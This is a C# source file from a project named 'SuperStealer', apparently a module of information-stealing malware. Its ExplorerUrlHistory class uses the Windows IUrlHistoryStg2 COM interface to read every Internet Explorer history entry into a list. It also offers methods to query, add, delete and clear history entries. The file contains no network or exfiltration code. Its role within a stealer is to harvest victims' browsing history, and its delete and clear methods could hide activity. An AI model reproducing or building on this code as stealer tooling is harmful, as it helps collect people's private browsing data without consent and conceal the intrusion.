namespace SuperStealer
{
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;

    public class ExplorerUrlHistory : IDisposable
    {
        private List<STATURL> _urlHistoryList;
        private readonly IUrlHistoryStg2 obj;
        private UrlHistoryClass urlHistory = new UrlHistoryClass();

        public ExplorerUrlHistory()
        {
            this.obj = (IUrlHistoryStg2) this.urlHistory;
            STATURLEnumerator enumerator = new STATURLEnumerator((IEnumSTATURL) this.obj.EnumUrls);
            this._urlHistoryList = new List<STATURL>();
            enumerator.GetUrlHistory(this._urlHistoryList);
        }

        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
        {
            this.obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
        }

        public void ClearHistory()
        {
            this.obj.ClearHistory();
        }

        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
        {
            try
            {
                this.obj.DeleteUrl(pocsUrl, dwFlags);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public void Dispose()
        {
            Marshal.ReleaseComObject(this.obj);
            this.urlHistory = null;
        }

        public STATURLEnumerator GetEnumerator()
        {
            return new STATURLEnumerator((IEnumSTATURL) this.obj.EnumUrls);
        }

        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {
            STATURL lpSTATURL = new STATURL();
            try
            {
                this.obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                return lpSTATURL;
            }
            catch (FileNotFoundException)
            {
                return lpSTATURL;
            }
        }

        public int Count
        {
            get
            {
                return this._urlHistoryList.Count;
            }
        }

        public STATURL this[int index]
        {
            get
            {
                if ((index >= this._urlHistoryList.Count) || (index < 0))
                {
                    throw new IndexOutOfRangeException();
                }
                return this._urlHistoryList[index];
            }
            set
            {
                if ((index >= this._urlHistoryList.Count) || (index < 0))
                {
                    throw new IndexOutOfRangeException();
                }
                this._urlHistoryList[index] = value;
            }
        }

        public class STATURLEnumerator
        {
            private readonly IEnumSTATURL _enumerator;
            private int _index;
            private STATURL _staturl;

            public STATURLEnumerator(IEnumSTATURL enumerator)
            {
                this._enumerator = enumerator;
            }

            public ExplorerUrlHistory.STATURLEnumerator Clone()
            {
                IEnumSTATURL mstaturl;
                this._enumerator.Clone(out mstaturl);
                return new ExplorerUrlHistory.STATURLEnumerator(mstaturl);
            }

            public void GetUrlHistory(IList list)
            {
                while (true)
                {
                    this._staturl = new STATURL();
                    this._enumerator.Next(1, ref this._staturl, out this._index);
                    if (this._index == 0)
                    {
                        this._enumerator.Reset();
                        return;
                    }
                    list.Add(this._staturl);
                }
            }

            public bool MoveNext()
            {
                this._staturl = new STATURL();
                this._enumerator.Next(1, ref this._staturl, out this._index);
                if (this._index == 0)
                {
                    return false;
                }
                return true;
            }

            public void Reset()
            {
                this._enumerator.Reset();
            }

            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
            {
                this._enumerator.SetFilter(poszFilter, dwFlags);
            }

            public void Skip(int celt)
            {
                this._enumerator.Skip(celt);
            }

            public STATURL Current
            {
                get
                {
                    return this._staturl;
                }
            }
        }
    }
}

